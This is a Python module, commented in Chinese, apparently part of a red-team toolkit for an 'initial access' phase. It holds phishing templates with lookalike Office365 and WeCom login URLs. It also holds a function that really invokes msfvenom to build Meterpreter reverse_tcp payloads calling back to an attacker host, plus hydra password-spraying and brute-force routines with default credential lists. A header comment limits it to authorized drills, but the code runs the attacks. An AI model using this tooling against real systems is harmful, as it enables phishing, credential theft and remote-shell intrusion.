# -*- coding: utf-8 -*-
"""
red_initial_access_phase.py — 红队阶段2：初始访问。

功能:
    - 钓鱼演练框架（邮件模板 / 钓鱼页面 / Payload 生成）
    - 漏洞利用框架（Exploit-DB 关联 / Metasploit framework）
    - 凭据攻击框架（密码喷洒 / 撞库 / 暴力破解）

真实工具调用用 subprocess，超时 300 秒；未安装明确提示，不 mock。
"""

from __future__ import annotations

import os
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

IA_TIMEOUT = 300


def _which(name: str) -> Optional[str]:
    return shutil.which(name)


@dataclass
class IAResult:
    target: str = ""
    module: str = ""
    tool: str = ""
    available: bool = False
    command: str = ""
    elapsed: float = 0.0
    findings: List[Dict[str, Any]] = field(default_factory=list)
    payload_path: str = ""
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target": self.target, "module": self.module,
            "tool": self.tool, "available": self.available,
            "command": self.command,
            "elapsed": round(self.elapsed, 2),
            "findings": self.findings,
            "finding_count": len(self.findings),
            "payload_path": self.payload_path,
            "error": self.error,
        }


PHISH_TEMPLATES = {
    "office365_login": {
        "name": "Office365 登录钓鱼页",
        "subject": "您的邮箱存储空间已满，请立即验证",
        "url": "https://login.microsoftonline.com-{brand}.{domain}/",
    },
    "wecom_notice": {
        "name": "企业微信通知钓鱼",
        "subject": "[企业微信] 您有一条待处理审批",
        "url": "https://work.weixin.qq.com-{brand}.{domain}/",
    },
    "hr_onboarding": {
        "name": "HR 入职材料钓鱼",
        "subject": "【人力资源】请尽快填写入职信息",
        "url": "https://{domain}/onboarding/",
    },
}

COMMON_USERS = ["admin", "administrator", "root", "test", "user",
                "support", "service", "guest"]
COMMON_PASSWORDS = ["Password123!", "Admin@123", "123456", "P@ssw0rd",
                    "Welcome1", "Qwerty123", "admin123", "Changeme1"]


class RedInitialAccessPhase:
    """红队阶段2：初始访问。"""

    def __init__(self) -> None:
        self.msf_bin = _which("msfconsole")
        self.hydra_bin = _which("hydra")
        self.searchsploit_bin = _which("searchsploit")

    # ------------------------------------------------------------------ #
    # 钓鱼演练框架
    # ------------------------------------------------------------------ #
    def phishing_templates(self, brand: str = "",
                           domain: str = "") -> Dict[str, Any]:
        """列出钓鱼邮件模板（仅演练，需授权）。"""
        out = []
        for key, tpl in PHISH_TEMPLATES.items():
            url = tpl["url"].replace("{brand}", brand or "sso") \
                .replace("{domain}", domain or "target.com")
            out.append({"id": key, **tpl, "rendered_url": url})
        return {"templates": out, "count": len(out),
                "note": "仅用于授权红队演练（OSSTMM/PTES 范围）"}

    def generate_payload(self, payload: str = "windows/meterpreter/reverse_tcp",
                         lhost: str = "", lport: int = 4444,
                         fmt: str = "exe") -> IAResult:
        """msfvenom 生成 Payload（真实调用）。"""
        r = IAResult(target=f"{lhost}:{lport}", module="payload",
                     tool="msfvenom")
        msfvenom = self.msf_bin or _which("msfvenom")
        if not msfvenom and not _which("msfvenom"):
            r.available = False
            r.error = ("msfvenom 未安装（Kali 自带 Metasploit）。"
                       "未生成 Payload，不 mock。")
            return r
        out_dir = os.path.join(os.getcwd(), "reports", "red_blue_pro",
                               "payloads")
        os.makedirs(out_dir, exist_ok=True)
        out_path = os.path.join(out_dir, f"payload_{int(time.time())}.{fmt}")
        cmd = [_which("msfvenom") or "msfvenom",
               "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
               "-f", fmt, "-o", out_path]
        r.available = True
        r.command = " ".join(cmd)
        t0 = time.time()
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=IA_TIMEOUT, encoding="utf-8",
                                  errors="replace", shell=False)
            r.elapsed = time.time() - t0
            if os.path.exists(out_path):
                r.payload_path = out_path
                r.findings.append({"status": "ok",
                                   "size": os.path.getsize(out_path)})
            else:
                r.error = (proc.stderr or proc.stdout or "")[-500:]
        except subprocess.TimeoutExpired:
            r.error = f"超时（>{IA_TIMEOUT}s）"
        except Exception as e:  # noqa: BLE001
            r.error = f"{type(e).__name__}: {e}"
        return r

    # ------------------------------------------------------------------ #
    # 漏洞利用框架
    # ------------------------------------------------------------------ #
    def exploit_search(self, keyword: str) -> IAResult:
        """searchsploit 在 Exploit-DB 本地库检索。"""
        r = IAResult(target=keyword, module="exploitdb",
                     tool="searchsploit")
        if not self.searchsploit_bin:
            r.available = False
            r.error = ("searchsploit 未安装（Kali 自带 exploitdb）。"
                       "可在线查询 https://www.exploit-db.com 。")
            return r
        r.available = True
        cmd = [self.searchsploit_bin, "--disable-colors", keyword]
        r.command = " ".join(cmd)
        t0 = time.time()
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=IA_TIMEOUT, encoding="utf-8",
                                  errors="replace", shell=False)
            r.elapsed = time.time() - t0
            for line in (proc.stdout or "").splitlines():
                line = line.strip()
                if line and "Exploit Title" not in line and \
                        "---" not in line:
                    r.findings.append({"title": line[:200]})
        except Exception as e:  # noqa: BLE001
            r.error = f"{type(e).__name__}: {e}"
        return r

    def msf_module_run(self, module: str, options: str = ""
                       ) -> IAResult:
        """Metasploit 模块调用（框架，不自动执行攻击性 payload）。"""
        r = IAResult(target=module, module="metasploit", tool="msfconsole")
        if not self.msf_bin:
            r.available = False
            r.error = ("msfconsole 未安装。Metasploit 模块仅作框架提示。")
            return r
        r.available = True
        r.findings.append({"module": module, "options": options,
                           "note": "已生成 msfconsole 命令模板"})
        r.command = f"msfconsole -q -x 'use {module}; set RHOSTS " \
                    f"<target>; {options}; run; exit'"
        return r

    # ------------------------------------------------------------------ #
    # 凭据攻击框架
    # ------------------------------------------------------------------ #
    def password_spray(self, target: str, service: str = "smb",
                       password: str = "Password123!",
                       users: Optional[List[str]] = None) -> IAResult:
        """密码喷洒（hydra）。同一密码对多个账号，避免锁定。"""
        users = users or COMMON_USERS
        r = IAResult(target=target, module="spray", tool="hydra")
        if not self.hydra_bin:
            r.available = False
            r.error = ("hydra 未安装（Kali 自带）。未执行喷洒，不 mock。")
            return r
        r.available = True
        # 写临时用户表
        import tempfile
        uf = os.path.join(tempfile.gettempdir(), "rbp_spray_users.txt")
        with open(uf, "w", encoding="utf-8") as f:
            f.write("\n".join(users))
        cmd = [self.hydra_bin, "-L", uf, "-p", password, "-t", "4",
               "-f", f"{service}://{target}"]
        r.command = " ".join(cmd)
        t0 = time.time()
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=IA_TIMEOUT, encoding="utf-8",
                                  errors="replace", shell=False)
            r.elapsed = time.time() - t0
            for line in (proc.stdout or "").splitlines():
                if "login:" in line.lower() or "[+]" in line:
                    r.findings.append({"hit": line.strip()[:200]})
        except subprocess.TimeoutExpired:
            r.error = f"超时（>{IA_TIMEOUT}s）"
        except Exception as e:  # noqa: BLE001
            r.error = f"{type(e).__name__}: {e}"
        return r

    def brute_force(self, target: str, service: str = "ssh",
                    limit: int = 20) -> IAResult:
        """暴力破解（hydra，小字典，避免长时间锁定）。"""
        r = IAResult(target=target, module="brute", tool="hydra")
        if not self.hydra_bin:
            r.available = False
            r.error = "hydra 未安装。未执行暴力破解，不 mock。"
            return r
        r.available = True
        import tempfile
        uf = os.path.join(tempfile.gettempdir(), "rbp_brute_users.txt")
        pf = os.path.join(tempfile.gettempdir(), "rbp_brute_pass.txt")
        with open(uf, "w", encoding="utf-8") as f:
            f.write("\n".join(COMMON_USERS[:5]))
        with open(pf, "w", encoding="utf-8") as f:
            f.write("\n".join(COMMON_PASSWORDS[:limit]))
        cmd = [self.hydra_bin, "-L", uf, "-P", pf, "-t", "4", "-f",
               f"{service}://{target}"]
        r.command = " ".join(cmd)
        t0 = time.time()
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=IA_TIMEOUT, encoding="utf-8",
                                  errors="replace", shell=False)
            r.elapsed = time.time() - t0
            for line in (proc.stdout or "").splitlines():
                if "[+]" in line or "login:" in line.lower():
                    r.findings.append({"hit": line.strip()[:200]})
        except subprocess.TimeoutExpired:
            r.error = f"超时（>{IA_TIMEOUT}s）"
        except Exception as e:  # noqa: BLE001
            r.error = f"{type(e).__name__}: {e}"
        return r

    # ------------------------------------------------------------------ #
    def tool_status(self) -> Dict[str, Any]:
        return {
            "msfconsole": self.msf_bin or "not_found",
            "msfconsole_available": bool(self.msf_bin),
            "hydra": self.hydra_bin or "not_found",
            "hydra_available": bool(self.hydra_bin),
            "searchsploit": self.searchsploit_bin or "not_found",
            "searchsploit_available": bool(self.searchsploit_bin),
            "common_users": len(COMMON_USERS),
            "common_passwords": len(COMMON_PASSWORDS),
            "timeout": IA_TIMEOUT,
        }


_default: Optional[RedInitialAccessPhase] = None


def get_red_initial_access_phase() -> RedInitialAccessPhase:
    global _default
    if _default is None:
        _default = RedInitialAccessPhase()
    return _default
